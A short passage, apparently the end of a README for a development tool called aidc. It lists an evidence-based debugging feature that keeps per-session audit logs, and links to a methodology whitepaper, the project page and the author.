| Evidence-Based Debugging | Structured audit log at `~/aidc-audit/<session>-<ts>/` for every session |

Violations caught at commit time. Not production.

- [EAD Whitepaper](https://doi.org/10.5281/zenodo.17968797) — Full methodology
- [aidc on pace.org](https://pace.org/projects/aidc/) — Project page
- [Mark Pace](https://pace.org) — Author
